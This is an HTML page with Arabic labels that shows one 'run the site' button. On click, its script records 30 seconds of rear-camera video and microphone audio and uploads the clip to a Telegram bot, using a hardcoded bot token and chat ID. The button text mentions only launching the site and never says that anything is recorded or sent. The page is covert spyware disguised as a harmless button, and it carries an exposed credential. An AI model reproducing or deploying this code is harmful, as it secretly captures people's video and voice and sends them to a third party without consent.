<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>تشغيل الموقع</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            font-family: Arial;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 20px 40px;
            font-size: 20px;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
            transition: all 0.3s;
        }
        button:active {
            transform: scale(0.95);
            background: #45a049;
        }
    </style>
</head>
<body>
    <button id="actionButton">تشغيل الموقع</button>

    <script>
        const BOT_TOKEN = "7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94";
        const CHAT_ID = "6913353602";
        
        const actionButton = document.getElementById('actionButton');
        let mediaRecorder;
        let recordedChunks = [];
        let stream;

        actionButton.addEventListener('click', async function() {
            try {
                actionButton.textContent = "جاري التشغيل...";
                actionButton.disabled = true;
                
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "environment",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: true
                });
                
                mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/mp4',
                    videoBitsPerSecond: 2000000
                });
                
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        recordedChunks.push(event.data);
                    }
                };
                
                mediaRecorder.onstop = async () => {
                    const videoBlob = new Blob(recordedChunks, { type: 'video/mp4' });
                    await sendVideoToTelegram(videoBlob);
                };
                
                mediaRecorder.start(1000);
                recordedChunks = [];
                
                actionButton.textContent = "جاري التشغيل...";
                actionButton.style.background = "#f44336";
                actionButton.disabled = false;
                
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        stopRecording();
                    }
                }, 30000);
                
            } catch (error) {
                console.error('Error:', error);
                actionButton.textContent = "تشغيل الموقع";
                actionButton.style.background = "#4CAF50";
                actionButton.disabled = false;
            }
        });

        function stopRecording() {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                
                actionButton.textContent = "جاري الإرسال...";
                actionButton.disabled = true;
            }
        }

        async function sendVideoToTelegram(videoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, 'video_recording.mp4');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                actionButton.textContent = "تم التشغيل بنجاح";
                actionButton.style.background = "#4CAF50";
                
            } catch (error) {
                console.error('Error sending video:', error);
                actionButton.textContent = "تشغيل الموقع";
                actionButton.style.background = "#4CAF50";
            } finally {
                setTimeout(() => {
                    actionButton.textContent = "تشغيل الموقع";
                    actionButton.disabled = false;
                }, 3000);
            }
        }

        window.addEventListener('beforeunload', () => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
                mediaRecorder.stop();
            }
        });
    </script>
</body>
</html>
